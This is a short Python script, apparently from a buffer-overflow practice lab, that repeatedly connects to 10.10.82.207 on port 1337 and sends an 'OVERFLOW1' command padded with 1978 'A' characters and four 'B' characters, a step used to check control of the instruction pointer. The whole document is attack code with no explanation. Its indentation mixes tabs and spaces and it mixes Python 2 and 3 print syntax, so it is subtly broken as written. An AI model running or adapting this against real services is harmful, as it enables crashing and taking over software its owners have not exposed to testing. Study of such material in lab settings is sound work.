#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 1978 + "B" * 4

while True:
        try:
        	print('FUZZED WITH BUFFER SIZE OF ' + str(len(buffer)))
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('10.10.82.207',1337))
                s.send(('OVERFLOW1 ' + buffer))
                s.recv(1024)
                s.close()
                sleep(1)
               

        except:
                print 'FUZZING crashed at %s bytes' % str(len(buffer))
                sys.exit()
